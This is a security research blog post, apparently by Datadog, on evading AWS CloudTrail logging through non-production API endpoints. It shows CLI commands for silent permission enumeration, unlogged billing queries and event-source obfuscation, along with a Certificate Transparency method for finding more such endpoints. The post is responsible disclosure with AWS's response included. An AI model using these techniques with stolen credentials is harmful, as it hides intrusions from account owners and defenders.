@@ -1,0 +1,473 @@
+
+Key Points
+
+We identified two new archetypes for bypassing AWS CloudTrail through certain non-production endpoints with API actions that access account-level information and through API calls which generate multiple events in CloudTrail.
+We disclosed an example of both of these types to AWS who have since remediated these specific bypasses. One was in ce:GetCostAndUsage and the other was for route53resolver:ListFirewallConfigs.
+We determined that non-production AWS API endpoints could be used for permission enumeration without logging to CloudTrail. Since our initial public disclosure of this technique, we’ve collaborated closely with AWS to illustrate how adversaries could leverage this method to stealthily assess the privileges of compromised credentials. As a result of this partnership, AWS has classified this technique as a security issue and is actively remediating instances of it.
+We have found numerous non-production endpoints which could be used for silent permission enumeration. Red Teamers or Penetration Testers looking to demonstrate sophisticated defense evasion techniques can leverage the methodology we describe below to find more. We encourage contacting the AWS Security Team after you’ve used them. If you discover a non-production endpoint that exhibits this behavior you can report it to the AWS Security Team at aws-security@amazon.com.
+The response to this research from AWS can be found below.
+Disclosure timeline
+This timeline encompasses the two CloudTrail bypass disclosures as well as the other research covered in this article.
+
+June 27, 2023: We identified two CloudTrail bypasses for AWS Cost Explorer and Route 53 Resolver.
+June 27, 2023: We reported both issues to AWS.
+June 27, 2023: AWS responded that they were investigating.
+July 21, 2023: AWS released a fix for the CloudTrail bypass in AWS Cost Explorer.
+August 7, 2023: AWS released a fix for the CloudTrail bypass in Route 53.
+September 18, 2023: Datadog followed up with the AWS Security Outreach team.
+September 28, 2023: AWS requested to delay publication of this research until additional mitigation processes were rolled out.
+November 14, 2023: Datadog followed up with the AWS Security Outreach team.
+December 5, 2023: AWS provided a brief update on ongoing mitigation efforts.
+December 13, 2023: Datadog asked for clarification on when these efforts would be completed.
+January 3, 2024: Datadog followed up with the AWS Security Outreach team.
+March 1, 2024: AWS provided an update on mitigation efforts.
+May 27, 2024: Datadog Security Research published this blog post.
+Introduction
+Cloud security researchers primarily focus on enumerating the attack surface of cloud services. We aim to uncover potential misconfigurations, to predict how they could be abused by an adversary, and to share our findings with the community. As cloud security research continues to progress, researchers are beginning to look for vulnerabilities beyond individual cloud services, turning instead to the fabric itself of cloud service providers.
+Building once again on our previous work where we introduced a new vulnerability class of CloudTrail bypasses, in this blog post we will be further expanding upon the topic of non-production endpoints, a subject that we originally introduced at fwd:cloudsec and later elaborated upon on the main stage of Black Hat USA 2023.
+In this blog post we will cover our research on how non-production endpoints could be used for defense evasion. We’ll share new methods we’ve discovered to bypass CloudTrail while accessing account-level information and partial bypasses using API calls that invoke multiple actions. We will also discuss the automation we developed to find non-production endpoints at scale.
+An introduction to AWS API endpoints
+It can be easy to mistake the AWS API for a single monolith, but the AWS API is actually made up of many small APIs for each service. When you interact with the AWS API, the endpoints you connect to will differ service by service and region by region.
+Typically, the format for those endpoints are as follows:
+<service name>.<region>.amazonaws.com
+For example, possible endpoints include:
+kms.us-east-1.amazonaws.com
+glue.eu-west-3.amazonaws.com
+compute-optimizer.us-east-2.amazonaws.com
+evidently.us-west-2.amazonaws.com
+appconfig.eu-west-1.amazonaws.com
+These are all examples of production AWS API endpoints. These are the endpoints that the console, SDKs, and by extension, the CLI use to interact with the various AWS services.
+As we will describe later in this blog post, we have found that there are also thousands of non-production endpoints that appear to serve a variety of purposes. The following list gives some examples of these non-production endpoints and of the environments in which they can appear:
+
+Pre-production environments, such as pipes-preprod.us-east-1.amazonaws.com and forecast-preprod.us-west-2.amazonaws.com
+Deployment pipelines, such as ssm-gamma.us-west-1.amazonaws.com, dataexchange-gamma.us-west-1.amazonaws.com, and ivschat-gamma.ap-south-1.amazonaws.com
+Integration testing environments, such as  athena-webservice-beta-integ.us-east-1.amazonaws.com and es-integ.us-east-1.amazonaws.com
+Preview environments, such as rds-preview.us-east-2.amazonaws.com and workspaces-gamma-preview.us-west-2.amazonaws.com
+What is noteworthy about these endpoints is that they can sometimes be accessed through the internet and authenticated against by using normal IAM credentials, allowing us to interact with these services. The IAM authentication and authorization functions are global, which means that they are present in both production and non-production endpoints. You do not need different credentials to invoke API calls using non-production endpoints. This is further validated by the fact that invocations made to non-production endpoints will appear in the IAM credential report.
+This opens up the possibility to allow an attacker who has stolen IAM credentials to a victim’s AWS account to interact with these endpoints. As we’ll show, these non-production endpoints have a variety of uses for defense evasion in AWS environments. For example, they have been shown to allow an attacker to interact with the AWS API while avoiding CloudTrail logging.
+Non-production endpoint behavior
+Non-production endpoints can exhibit a variety of different behaviors, depending on how they have been configured and what they are intended to be used for.
+Non-functional but IAM enabled endpoints
+In what we can call a first category, some non-production endpoints are seemingly non-functional but still rely on IAM authorization. As an example, when we attempted to interact with macie2.redacted-mds.us-east-1.macie.aws.a2z.com with a role that has sufficient privileges, we receive an internal server error:
+nick.frichette@host % aws macie2 list-findings \
+--endpoint-url https://macie2.redacted-mds.us-east-1.macie.aws.a2z.com
+
+An error occurred (InternalServerErrorException) when calling the ListFindings operation (reached max retries: 2): Internal server error
+However, if we perform that same action with a role that has no privileges at all, we get the standard error message:
+nick.frichette@host % aws macie2 list-findings \
+--endpoint-url https://macie2.redacted-mds.us-east-1.macie.aws.a2z.com
+
+An error occurred (AccessDeniedException) when calling the ListFindings operation: User: arn:aws:sts::111111111111:assumed-role/noperm/noperm is not authorized to perform: macie2:ListFindings on resource: arn:aws:macie2:us-east-1:111111111111:*
+This indicates that the endpoint is properly deserializing the request, determining what the requested API call is, and evaluating whether the calling principal has sufficient privileges. However, it appears to error out at a later stage. For this category of endpoint, it may or may not log to CloudTrail. In this specific example, it did not.
+Endpoints with access to production resources that don’t log to CloudTrail
+A second category of non-production endpoints, are ones that have access to production resources but do not log to CloudTrail. As we showed previously with AWS Service Catalog, these endpoints may provide the opportunity for an attacker to take action in an AWS account while avoiding detection.
+Isolated endpoints
+For the final category, some non-production endpoints are isolated from production resources. By this, we mean that you cannot view resources that exist by using the API. Attempts to view resources do not return an error, only an empty list. If you create a resource using a non-production endpoint of this type, that resource will be queryable and will function properly—so long as you use the non-production endpoint to interact with it. The only limitation is that these non-production endpoints are isolated from production resources.
+To demonstrate this behavior, we’ll use the endpoint starport.us-west-2.amazonaws.com, which is associated with the Elastic Container Registry (ECR) service. In this demonstration we will:
+
+Perform the ecr:DescribeRepositories API call by using a normal production endpoint to show that we have access to a particular resource in the account via this endpoint.
+Show that when interacting with the non-production endpoint starport.us-west-2.amazonaws.com, we do not have access to the same resource—which reveals this endpoint’s isolation.
+Show that when we create a resource with this type of non-production endpoint, that resource does not propagate to the production endpoint/environment—which again reveals the endpoint’s isolation.
+Demonstrate that resources created through this type of endpoint, though isolated, are still functional.
+Note: As a part of our disclosure, AWS has disabled the functionality of this endpoint. Attempting to perform these steps will no longer work.
+For step 1, we used the AWS CLI to perform the ecr:DescribeRepositories action by using the production endpoint; ecr.us-west-2.amazonaws.com.
+nick.frichette@host % aws ecr describe-repositories
+{
+    "repositories": [
+        {
+            "repositoryArn": "arn:aws:ecr:us-west-2:111111111111:repository/normal-repo",
+            "registryId": "111111111111",
+            "repositoryName": "normal-repo",
+            "repositoryUri": "111111111111.dkr.ecr.us-west-2.amazonaws.com/normal-repo",
+            "createdAt": "2023-08-15T11:59:00-05:00",
+            "imageTagMutability": "MUTABLE",
+            "imageScanningConfiguration": {
+                "scanOnPush": false
+            },
+            "encryptionConfiguration": {
+                "encryptionType": "AES256"
+            }
+        }
+    ]
+}
+In our example, we see a repository named normal-repo exists.
+For step 2, let’s recreate our example, except this time, we will interact with the non-production endpoint starport.us-west-2.amazonaws.com by using the endpoint-url flag.
+nick.frichette@host % aws ecr describe-repositories \
+--endpoint-url https://starport.us-west-2.amazonaws.com
+{
+    "repositories": []
+}
+We get back a successful (albeit empty) response from the API. What happened? It appears that the endpoint starport.us-west-2.amazonaws.com does not have access to production resources. In this situation it cannot see the normal-repo.
+This isolation can be demonstrated going the other direction as well: For step 3, let’s first create an isolated-repo using the non-production endpoint:
+nick.frichette@host % aws ecr create-repository \
+--endpoint-url https://starport.us-west-2.amazonaws.com \
+--repository-name isolated-repo
+{
+    "repository": {
+        "repositoryArn": "arn:aws:ecr:us-west-2:111111111111:repository/isolated-repo",
+        "registryId": "111111111111",
+        "repositoryName": "isolated-repo",
+        "repositoryUri": "111111111111.dkr.starport.us-west-2.amazonaws.com/isolated-repo",
+        "createdAt": "2023-10-24T13:18:02.145000-05:00",
+        "imageTagMutability": "MUTABLE",
+        "imageScanningConfiguration": {
+            "scanOnPush": false
+        },
+        "encryptionConfiguration": {
+            "encryptionType": "AES256"
+        }
+    }
+}
+Then, when we attempt to list repositories using the normal endpoint, we see that the isolated-repo does not appear (the normal-repo was removed for the sake of brevity):
+nick.frichette@host % aws ecr describe-repositories
+{
+    "repositories": []
+}
+It is worth noting that although this endpoint was isolated from production resources, the new resources created via this endpoint were still functional. For step 4, we can authenticate to the repository URI by using the AWS CLI and Docker:
+nick.frichette@host % aws ecr get-login-password \
+--endpoint-url https://starport.us-west-2.amazonaws.com \
+| \
+docker login --username AWS \
+--password-stdin 677301038893.dkr.starport.us-west-2.amazonaws.com/sneaky
+Login Succeeded
+
+nick.frichette@host % docker push 111111111111.dkr.starport.us-west-2.amazonaws.com/isolated-repo
+Using default tag: latest
+The push refers to repository [111111111111.dkr.starport.us-west-2.amazonaws.com/isolated-repo]
+d2d3127fc3d3: Pushed
+latest: digest: sha256:8fa94f9751711db9965a1ee6e092ab12d3d1ae059e1e2994f1f5e50ba7364dad size: 529
+We are able to interact with this resource because it is accessible over the internet at its repositoryUri. In situations where you attempt to provide the ARN of a resource that exists in an environment isolated from a production API, the API will act as if the resource does not exist—even though it does (in a separate environment).
+Finally, on the topic of observability, isolated endpoints may or may not log to CloudTrail. In this specific example of starport.us-west-2.amazonaws.com, it did not appear in CloudTrail. Presumably this is because it was logging to test systems that are not visible to customers (because AWS doesn’t expect customers to be using these environments/endpoints). If an adversary identifies a malicious use for these endpoints (as we will do later on in this post), the victim has no way of identifying that this behavior has occurred.
+Now that we have covered that non-production endpoints may have security implications, how do we find as many of them as possible?
+Finding non-production endpoints at scale
+As a part of this research project, we explored multiple paths to enumerating these endpoints. Eventually, we found Certificate Transparency logging to be the best technique.
+Certificate Transparency is a framework for publicly logging the issuance of TLS certificates. This information is helpful to identify fraudulent domains, such as when someone attempts to impersonate a domain or brand. For example, if someone attempts to generate a TLS certificate for datad0g.com, Certificate Transparency can help identify this behavior, allowing the certificate to be revoked.
+From an attacker’s perspective, Certificate Transparency is useful for quickly finding DNS subdomains, such as starport.us-west-2.amazonaws.com, that would otherwise be difficult to find through normal enumeration or brute force. With this in mind, we made use of an open source tool named Cert Spotter. Cert Spotter allows you to monitor DNS domains, including all their subdomains, to detect when new TLS certificates are issued—which occurs when a new certificate is created or an existing one is expiring and needs to be renewed. And when such activity is detected, Cert Spotter then forwards the certificates to a script for further processing.
+How we automated domain discovery
+To discover the DNS subdomains corresponding to AWS endpoints, we drew upon the functionality described above to build the following workflow:
+
+Cert Spotter runs on an EC2 instance and monitors for subdomains of the following DNS domains and is forwarded to an SQS queue:
+amazonaws.com
+aws.dev
+on.aws
+a2z.com
+api.aws
+
+That SQS queue feeds a Lambda function, which attempts to determine whether the domain is an AWS API. It does this by comparing the response to known responses from other AWS API endpoints. If it determines that the endpoint is a part of the AWS API, it is stored in a DynamoDB table and forwarded to the next SQS queue.
+The second SQS queue feeds an autoscaling group of EC2 instances that attempt to fingerprint which service(s) the API endpoint belongs to. This is done by iterating through all actions in the AWS CLI and checking for a successful response. If we receive one, we know that the endpoint is associated with a particular service, and then that pairing is stored in another DynamoDB table.
+An overview of the results
+We let this automation run from June 21, 2023 to October 23, 2023, and then again between March 25, 2024 and May 9, 2024. In that time it processed over 83,514,897 unique domains, of which 48,539 exhibited behavior similar to an AWS API, and 6,516 were fingerprinted to a specific AWS service.
+You will notice the gap between the total number of domains analyzed and the number of AWS API endpoints that were identified. It is important to note that a significant number of the domains analyzed by this automation were either already expired or inaccessible from the internet. For example, ~56% of the total number of domains analyzed were a subdomain of quickbeam.acm.aws.dev, none of which resolved to an IP address.
+Furthermore, ~11% of the total number of domains analyzed belonged to VPC endpoints. While these endpoints can ironically be used for defense evasion themselves, they cannot be reached outside of a VPC.
+There is a second gap between the total number of AWS API endpoints and the number of fingerprinted ones. Presumably this is a result of those APIs being internal/undocumented,  since their models do not appear in the models of the AWS CLI. Here are some examples of unidentified AWS API endpoints:
+thanos.preprod.us-west-1.ml-platform.aws.a2z.com
+alpha.pdx.dataplane.colossus.ai.aws.dev
+gamma.eu-central-1.work-stream-service.crowdscale.aws.a2z.com
+6955.condensate-pump.eu-central-2.beta.basin.security.aws.dev
+bah.gamma.kraken.identity.aws.dev
+It is important to note that 6,516 count of fingerprinted endpoints includes a significant number of production endpoints as the automation did not differentiate between the two. Here are some examples of fingerprinted AWS API endpoints and their associated services.
+
+Amazon Simple Email Service: wvjfuvfiwz.us-east-1.amazonaws.com
+Amazon Timestream: p-syd-1.capi.ap-southeast-2.kronos.alameda.aws.dev
+Amazon FSx: simba-gamma.ca-central-1.amazonaws.com
+Amazon Kinesis Video Streams: gamma.us-east-1.acuity.amazonaws.com
+Amazon Detective: acctmgmt-fips.us-east-2.alpha.morocco.aws.a2z.com
+How non-production endpoints could be used in the wild
+Silent permission enumeration
+After gaining initial access to an environment, adversaries frequently perform reconnaissance to establish what they have access to. In AWS this involves enumerating permissions of the identity they have compromised or whose credentials they have stolen.
+The good news for defenders is that this activity is fairly easy to spot due to the number of CloudTrail logs that are generated by the attacker. In addition, there are a number of commercial security products that will detect this behavior out of the box.
+This noisy behavior serves as an excellent opportunity for defenders to identify suspicious activity in their environment and expel adversaries from it. And conversely, this is also why CloudTrail bypasses are such a concerning problem. Being able to silently enumerate permissions, or even access resources without leaving a trace, makes an attacker completely invisible to a victim.
+As previously mentioned, some non-production endpoints don’t log to CloudTrail, and as a result, they can be used by an adversary to enumerate permissions without leaving a trail. To demonstrate how this would work in practice, we can use the starport.us-west-2.amazonaws.com endpoint from above to determine if a set of stolen IAM access keys can perform the ecr:DescribeRepositories API action.
+Note: As a part of our disclosure, AWS has disabled the functionality of this endpoint. Attempting to perform these steps will no longer work.
+Here is example output from a role which has privileges to call ecr:DescribeRepositories:
+nick.frichette@host % aws ecr describe-repositories \
+--endpoint-url https://starport.us-west-2.amazonaws.com \
+--region us-west-2
+{
+    "repositories": []
+}
+And here is example output from a role which does not have privileges to make the API call:
+nick.frichette@host % aws ecr describe-repositories \
+--endpoint-url https://starport.us-west-2.amazonaws.com \
+--region us-west-2
+
+An error occurred (AccessDeniedException) when calling the DescribeRepositories operation: User: arn:aws:sts::111111111111:assumed-role/noperm/noperm is not authorized to perform: ecr:DescribeRepositories on resource: arn:aws:ecr:us-west-2:111111111111:repository/* because no identity-based policy allows the ecr:DescribeRepositories action
+By checking the differences in responses to API calls, an adversary can quietly determine what API actions they have access to, and since the endpoint does not log to CloudTrail, defenders lose out on a golden opportunity to detect suspicious activity in their AWS accounts. This technique could be automated to make this enumeration even faster and easier.
+While this specific example is for the ECR service, it is important to note that there are thousands of non-production endpoints, any number of which could exhibit similar behavior. From our research, this appears to be the most abundant category of endpoint. Red Teamers or Penetration Testers looking to demonstrate sophisticated defense evasion techniques can leverage the methodology we described to find more. We encourage contacting the AWS Security Team after you’ve used them.
+Accessing account-level information via isolated endpoints
+Previously we mentioned that some endpoints appear to be isolated from production resources. This means that those endpoints cannot see or modify resources that are created normally through the production endpoint. Despite this, we found that some isolated endpoints could retrieve account-level information such as billing or account settings without logging to CloudTrail.
+To understand this issue, it's first important to understand that IAM authentication and authorization functions are global, which means that they are present in both production and non-production endpoints. You do not need different credentials to invoke API calls using non-production endpoints. This is further validated by the fact that invocations made to non-production endpoints will appear in the IAM credential report.
+To demonstrate how we could access production account data from an isolated endpoint, take the following example: The Cost Explorer service (abbreviated as CE) has an API action called ce:GetCostAndUsage. This action will, according to the documentation, “retrieve cost and usage metrics for your account”. Because billing is built into my account, and not something I can directly change (it is not a resource like an S3 bucket), how will a non-production endpoint respond to this?
+We will answer this question next.
+For this example, we will use the isolated non-production endpoint us-east-1.gamma.iis.index.insights.aws.a2z.com, which belongs to the Cost Explorer service. In this demonstration, we will:
+
+Perform the ce:GetCostAndUsage API call by using a non-production endpoint.
+Compare the previous output to a normal invocation of ce:GetCostAndUsage showing that the results are identical.
+Demonstrate, by comparing the output of ce:GetAnomalyMonitors via both the production and non-production endpoints, that resources created using the production endpoint cannot be accessed by the non-production endpoint.
+For step 1, if we invoke ce:GetCostAndUsage from the CLI using this isolated non-production endpoint, we see that we get IDENTICAL results to the output of the production endpoint. Here is the non-prod endpoint response:
+nick.frichette@host % aws ce get-cost-and-usage \
+--time-period Start=2022-12-01,End=2023-01-01 \
+--granularity DAILY \
+--metrics AmortizedCost \
+--endpoint-url https://us-east-1.gamma.iis.index.insights.aws.a2z.com
+{
+    “ResultsByTime”: [
+        {
+            “TimePeriod”: {
+                “Start”: “2022-12-01”,
+                “End”: “2022-12-02”
+            },
+            “Total”: {
+                “AmortizedCost”: {
+                    “Amount”: “-980.8978247205”,
+                    “Unit”: “USD”
+                }
+            },
+            “Groups”: [],
+            “Estimated”: false
+        },
+        {
+            “TimePeriod”: {
+                “Start”: “2022-12-02”,
+                “End”: “2022-12-03”
+            },
+            “Total”: {
+                “AmortizedCost”: {
+                    “Amount”: “145.2553752719”,
+                    “Unit”: “USD”
+                }
+            },
+[...snip...]
+And here is step 2, or the response using the production endpoint:
+nick.frichette@host % aws ce get-cost-and-usage \
+--time-period Start=2022-12-01,End=2023-01-01 \
+--granularity DAILY \
+--metrics AmortizedCost
+{
+    “ResultsByTime”: [
+        {
+            “TimePeriod”: {
+                “Start”: “2022-12-01”,
+                “End”: “2022-12-02”
+            },
+            “Total”: {
+                “AmortizedCost”: {
+                    “Amount”: “-980.8978247205”,
+                    “Unit”: “USD”
+                }
+            },
+            “Groups”: [],
+            “Estimated”: false
+        },
+        {
+            “TimePeriod”: {
+                “Start”: “2022-12-02”,
+                “End”: “2022-12-03”
+            },
+            “Total”: {
+                “AmortizedCost”: {
+                    “Amount”: “145.2553752719”,
+                    “Unit”: “USD”
+                }
+            },
+[...snip...]
+Crucially, if we look at CloudTrail, we see that only one event is logged (the one using the production endpoint).
+The net result is that non-production endpoints that don’t log to CloudTrail and that have API actions related to account-level resources/data could be used to evade detection by an adversary.
+For step 3, to further emphasize the difference between account-level data and deployable resources, let’s look at another example using the same endpoints. If we invoke ce:GetAnomalyMonitors using the normal production endpoint, we see that there is an anomaly monitor in the account/region. An anomaly monitor is a resource that you can configure and deploy in your account similar to how you would create an S3 bucket or an EC2 instance.
+nick.frichette@host % aws ce get-anomaly-monitors
+{
+    "AnomalyMonitors": [
+        {
+            "MonitorArn": "arn:aws:ce::111111111111:anomalymonitor/51b81166-8d8a-47be-bcf9-e7d456dd3b61",
+            "MonitorName": "test-monitor",
+            "CreationDate": "2023-06-26T14:46:42.028Z",
+            "LastUpdatedDate": "2023-11-14T20:20:01.698Z",
+            "LastEvaluatedDate": "2023-11-14T20:20:01.698Z",
+            "MonitorType": "DIMENSIONAL",
+            "MonitorDimension": "SERVICE",
+            "DimensionalValueCount": 41
+        }
+    ]
+}
+However, if we invoke the same action by using the previous non-production endpoint, we see we get back an empty response.
+nick.frichette@host % aws ce get-anomaly-monitors \
+--endpoint-url https://us-east-1.gamma.iis.index.insights.aws.a2z.com
+{
+    “AnomalyMonitors”: []
+}
+This further illustrates that while this category of isolated non-production endpoint doesn’t have access to resources in the AWS account, they can still access information about the account itself.
+This particular example has been reported to AWS, who have since disabled the functionality of the endpoint. If you attempt to invoke ce:GetCostAndUsage, you will receive the following error message:
+nick.frichette@host % aws ce get-cost-and-usage \
+--time-period Start=2022-12-01,End=2023-01-01 \
+--granularity DAILY \
+--metrics AmortizedCost \
+--endpoint-url https://us-east-1.gamma.iis.index.insights.aws.a2z.com
+
+An error occurred (ValidationException) when calling the GetCostAndUsage operation: Operation invalid
+Partially bypassing CloudTrail with multiple events per action
+With respect to non-production endpoints, another security concern involves actions invoked by an AWS service on behalf of a user or role. More specifically, how do these actions work with non-production resources, and what are the security implications?
+As an example, when you invoke the action route53resolver:ListFirewallConfigs, two API calls will appear in CloudTrail: ec2:DescribeVpcs and the aforementioned route53resolver:ListFirewallConfigs.
+Presumably this is because the output of the ec2:DescribeVpcs call is used as an input to the route53resolver:ListFirewallConfigs operation. If we look at the CloudTrail logs for ec2:DescribeVpcs, we see the action was “invokedBy: AWS Internal”:
+[...snip...]
+    "invokedBy": "AWS Internal"
+},
+"eventTime": "2023-10-26T17:57:00Z",
+"eventSource": "ec2.amazonaws.com",
+"eventName": "DescribeVpcs",
+"awsRegion": "us-east-1",
+"sourceIPAddress": "AWS Internal",
+"userAgent": "AWS Internal",
+[...snip...]
+This invocation happens because AWS is performing this API call on our behalf in the background. The question this behavior raises is, “If I invoke this API call from a non-production endpoint that is siloed off from customer resources, will I get production data”? And specifically, will it see the VPCs?
+To test this, we first perform the API action normally:
+nick.frichette@host % aws route53resolver list-firewall-configs
+{
+    "FirewallConfigs": [
+        {
+            "Id": "rslvr-fc-87f4c39bbe2833de",
+            "ResourceId": "vpc-0973e264acd58f1e9",
+            "OwnerId": "111111111111",
+            "FirewallFailOpen": "DISABLED"
+        },
+        {
+            "Id": "rslvr-fc-35bf35e609e73f6a",
+            "ResourceId": "vpc-07abacd02c49b7c6d",
+            "OwnerId": "111111111111",
+            "FirewallFailOpen": "DISABLED"
+        },
+        {
+            "Id": "rslvr-fc-8d090c86345b36bc",
+            "ResourceId": "vpc-02d6b9f1bdf59fb0b",
+            "OwnerId": "111111111111",
+            "FirewallFailOpen": "DISABLED"
+        },
+[...snip...]
+And then we perform the action again, this time using the non-production endpoint route53resolver-beta.us-east-1.amazonaws.com:
+nick.frichette@host % aws route53resolver list-firewall-configs \
+--endpoint-url https://route53resolver-beta.us-east-1.amazonaws.com
+{
+    "FirewallConfigs": [
+        {
+            "Id": "rslvr-fc-87f4c39bbe2833de",
+            "ResourceId": "vpc-0973e264acd58f1e9",
+            "OwnerId": "111111111111",
+            "FirewallFailOpen": "DISABLED"
+        },
+        {
+            "Id": "rslvr-fc-35bf35e609e73f6a",
+            "ResourceId": "vpc-07abacd02c49b7c6d",
+            "OwnerId": "111111111111",
+            "FirewallFailOpen": "DISABLED"
+        },
+        {
+            "Id": "rslvr-fc-8d090c86345b36bc",
+            "ResourceId": "vpc-02d6b9f1bdf59fb0b",
+            "OwnerId": "111111111111",
+            "FirewallFailOpen": "DISABLED"
+        },
+[...snip...]
+As we can see, the resulting output is identical. But interestingly, when we look at CloudTrail for invocations made using the non-production endpoint, only the ec2:DescribeVpcs action is logged:
+In other words, the action that was actually invoked (route53resolver:ListFirewallConfigs) does not appear. Furthermore, an invocation using a non-production endpoint was able to invoke an additional API which had access to production resources.
+The net result is that adversaries may be able to obfuscate what API calls they make by using non-production endpoints that don’t log to CloudTrail.
+Note that this issue was also disclosed to AWS, who have since disabled the functionality of the endpoint. If you attempt to invoke it, you will receive the following error message:
+nick.frichette@host % aws route53resolver list-firewall-configs \
+--endpoint-url https://route53resolver-beta.us-east-1.amazonaws.com
+
+An error occurred (AccessDeniedException) when calling the ListFirewallConfigs operation: Account is not authorized to perform this operation.
+While this specific example is no longer vulnerable, it is important to note that there are thousands of non-production endpoints, any number of which could exhibit similar behavior.
+Event source obfuscation
+Aside from bypassing CloudTrail, non-production endpoints have an additional potential use case when it comes to defense evasion: event source obfuscation. To demonstrate this use case, we will perform ivs:ListChannels twice—the first time using the normal endpoint, and the second time using the non-production endpoint ivs-gamma.ap-northeast-1.amazonaws.com. These are both shown in the snippet below:
+nick.frichette@host % aws ivs list-channels \
+--region ap-northeast-1
+{
+    "channels": [
+        {
+            "arn": "arn:aws:ivs:ap-northeast-1:111111111111:channel/XT8717rmmcEc",
+            "authorized": false,
+            "insecureIngest": false,
+            "latencyMode": "LOW",
+            "name": "",
+            "preset": "",
+            "recordingConfigurationArn": "",
+            "tags": {},
+            "type": "STANDARD"
+        }
+    ]
+}
+
+nick.frichette@host % aws ivs list-channels \
+--region ap-northeast-1 \
+--endpoint-url https://ivs-gamma.ap-northeast-1.amazonaws.com
+{
+    "channels": [
+        {
+            "arn": "arn:aws:ivs:ap-northeast-1:111111111111:channel/XT8717rmmcEc",
+            "authorized": false,
+            "insecureIngest": false,
+            "latencyMode": "LOW",
+            "name": "",
+            "preset": "",
+            "recordingConfigurationArn": "",
+            "tags": {},
+            "type": "STANDARD"
+        }
+    ]
+}
+As we can see, the API calls return the same information. Presumably this endpoint is an example of a non-production endpoint that has access to production resources. What’s interesting is that CloudTrail will show two events being logged (which is correct); however, one of them will be different:
+Here we can see that the event source of the second API call, the one using the non-production endpoint, has an event source of gamma-starfruit.amazonaws.com. If an adversary can perform calls to the AWS API that leave non-standard event source entries in the resulting logs, even if it is logged to CloudTrail, this still poses a significant problem for defenders for two key reasons:
+
+A number of SIEM products, both commercial and open source, use the event source as a part of their detection rules. If the SIEM has a detection rule that uses the event source to determine which service an API call is associated with, an adversary could use a non-production endpoint with the same characteristics of the one shown above to bypass that detection rule.
+The event source of CloudTrail logs is often used to group events by service. If a company suffered an intrusion, it would be reasonable for them to want to gather all logs for an affected service during this time frame. Using the example above, if they attempted to gather all logs related to the IVS service, they would miss out on the malformed event, potentially causing them to miss evidence about the intrusion.
+While this specific example is for the IVS service, it is important to note that there are thousands of non-production endpoints, any number of which could exhibit similar behavior. AWS does not consider this to be a security issue at this time. For Red Teamers and Penetration Testers, event-source obfuscation may be an excellent method to avoid detection from some SIEMs and other log analysis tools.
+The response from AWS
+The following is a quote from the AWS Security Team:
+“AWS would like to thank Nick and Datadog for their collaboration in the responsible disclosure of this issue. There is no evidence of unintended access to customer data, or the inappropriate use of undocumented or non-production endpoints. AWS has resolved all reported concerns and encourages the submission of any new findings to aws-security@amazon.com.
+For isolated non-production endpoints that do not log to CloudTrail but are otherwise callable with normal credentials and exhibit normal IAM permission behavior, AWS considers the CloudTrail logging bypass of such endpoints also to be a security issue. If you find an API or APIs on an endpoint with these characteristics, please contact the AWS Security Team at aws-security@amazon.com.
+On the other hand, non-production endpoints that have access to production resources but generate CloudTrail events that do not match the events generated by the standard endpoint will not be remediated unless it is unclear what service and operation is involved. For defenders it is important to note that adversaries, to evade detection, may attempt to perform API calls using endpoints that exhibit this behavior.”
+Conclusion
+In this blog post, we showed that non-production endpoints can be used to enumerate permissions silently, allowing an adversary to perform reconnaissance without alerting a victim after gaining a foothold in an account. We also demonstrated that even when non-production endpoints are isolated from resources, we can still potentially access account level information. And we showed how an adversary can attempt to evade detection by using non-production endpoints to obfuscate the event source in generated CloudTrail events.
+We conclude that non-production endpoints can be used for a variety of defense evasion purposes, and that these non-production endpoints can harbor vulnerabilities. This is important because defense evasion capabilities in cloud environments are a significant challenge for customers who lose out on the opportunity to observe attackers in their own environments.
+As cloud security research continues to advance, we will continue to partner with AWS to ensure that vulnerabilities are resolved, and as always, to make the community aware of potential attacker tradecraft.
+aws-security@amazon.com
+pipes-preprod.us-east-1.amazonaws.com
+forecast-preprod.us-west-2.amazonaws.com
+ssm-gamma.us-west-1.amazonaws.com
+dataexchange-gamma.us-west-1.amazonaws.com
+ivschat-gamma.ap-south-1.amazonaws.com
+athena-webservice-beta-integ.us-east-1.amazonaws.com
+es-integ.us-east-1.amazonaws.com
+rds-preview.us-east-2.amazonaws.com
+workspaces-gamma-preview.us-west-2.amazonaws.com
+macie2.redacted-mds.us-east-1.macie.aws.a2z.com
+starport.us-west-2.amazonaws.com
+starport.us-west-2.amazonaws.com
+ecr.us-west-2.amazonaws.com
+normal-repo
+starport.us-west-2.amazonaws.com
+endpoint-url
+starport.us-west-2.amazonaws.com
+normal-repo
+isolated-repo
+isolated-repo
+normal-repo
+repositoryUri
+starport.us-west-2.amazonaws.com
+datad0g.com
+starport.us-west-2.amazonaws.com
+quickbeam.acm.aws.dev
+wvjfuvfiwz.us-east-1.amazonaws.com
+p-syd-1.capi.ap-southeast-2.kronos.alameda.aws.dev
+simba-gamma.ca-central-1.amazonaws.com
+gamma.us-east-1.acuity.amazonaws.com
+acctmgmt-fips.us-east-2.alpha.morocco.aws.a2z.com
+starport.us-west-2.amazonaws.com
+us-east-1.gamma.iis.index.insights.aws.a2z.com
+ce:GetCostAndUsage
+ce:GetCostAndUsage
+ec2:DescribeVpcs
+route53resolver:ListFirewallConfigs
+ec2:DescribeVpcs
+route53resolver-beta.us-east-1.amazonaws.com
+ec2:DescribeVpcs
+ivs-gamma.ap-northeast-1.amazonaws.com
+gamma-starfruit.amazonaws.com
